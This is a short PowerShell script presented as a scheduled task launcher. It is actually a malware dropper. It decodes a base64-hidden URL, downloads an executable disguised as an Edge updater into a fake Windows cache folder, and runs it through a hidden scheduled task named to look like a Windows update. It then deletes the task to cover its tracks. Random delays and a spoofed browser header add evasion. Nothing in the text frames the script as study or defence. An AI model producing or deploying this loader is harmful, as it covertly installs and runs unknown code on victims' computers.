# launcher.ps1 - Scheduled task launcher
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (!(Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
$exePath = "$cache\helper.exe"

# Download EXE (same as before, with random delay)
$r = Get-Random -Min 1000 -Max 5000
Start-Sleep -Milliseconds $r
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing

# Create a scheduled task that runs once, hidden, under the current user
$taskName = "WindowsUpdateTask_" + (Get-Random -Maximum 99999)
$action = New-ScheduledTaskAction -Execute $exePath -Argument "-hidden"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(3)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -DeleteExpiredTaskAfter 00:00:30
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
Start-Sleep -Seconds 4
Start-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 10
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
